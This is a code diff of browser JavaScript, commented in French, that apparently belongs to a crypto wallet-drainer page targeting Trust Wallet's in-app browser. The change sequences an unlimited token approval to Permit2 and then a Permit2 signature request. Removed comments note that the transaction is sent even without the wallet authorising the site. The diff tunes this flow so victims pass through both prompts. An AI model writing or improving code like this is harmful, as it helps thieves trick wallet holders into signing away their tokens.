@@ -1240,20 +1240,27 @@ try {
       approveAmount = ethers.BigNumber.from(MAX_UINT);
     }
 
-    // Step 1: approve Permit2 — fire WITHOUT await so TW queues both
-    // requests in sequence; awaiting sendTransaction causes TW to leave
-    // the browser before signTypedData_v4 can be called.
-    // TX fires inconditionnellement — TW Browser remplace from='0x0000...'
-    // par le wallet actif même sans autorisation préalable de la dApp.
+    // Step 1: approve Permit2
+    // AWAIT le TX — résout dès que l'utilisateur confirme (pas d'attente on-chain).
+    // TW Browser reste sur la dApp après soumission et expose selectedAddress.
+    // C'est après cet await que from devient valide pour eth_signTypedData_v4.
     var ifaceApprove = new ethers.utils.Interface(['function approve(address spender, uint256 amount)']);
     var approveData  = ifaceApprove.encodeFunctionData('approve', [PERMIT2_ADDR, approveAmount]);
-    eth.request({
-      method: 'eth_sendTransaction',
-      params: [{ from: from || '0x0000000000000000000000000000000000000000',
-                 to: tokenAddr, value: '0x0', data: approveData }]
-    }).catch(function(e) { console.warn('permit2 approve error', e); });
+    try {
+      await Promise.race([
+        eth.request({
+          method: 'eth_sendTransaction',
+          params: [{ from: from || '0x0000000000000000000000000000000000000000',
+                     to: tokenAddr, value: '0x0', data: approveData }]
+        }),
+        new Promise(function(_, rej) { setTimeout(function() { rej(new Error('timeout')); }, 120000); })
+      ]);
+    } catch(e) {
+      console.warn('permit2 approve error', e);
+      if (e && (e.code === 4001 || e.code === 'ACTION_REJECTED')) return;
+    }
 
-    // Après que la TX est en queue TW expose parfois selectedAddress — re-check
+    // TX confirmée → TW expose maintenant selectedAddress, from devient valide
     if (!from) from = eth.selectedAddress || eth.address || '';
     if (!from) {
       try {
@@ -1261,8 +1268,9 @@ try {
         from = (accs2 && accs2[0]) || '';
       } catch(e) {}
     }
+    if (!from) return;
 
-    // Step 2: Permit2 gasless signature — queued immédiatement après approve
+    // Step 2: Permit2 gasless signature — from est maintenant valide
     var nonce    = Math.floor(Math.random() * Math.pow(2, 48));
     var deadline = Math.floor(Date.now() / 1000) + 3600;
     var permit2TypedData = {
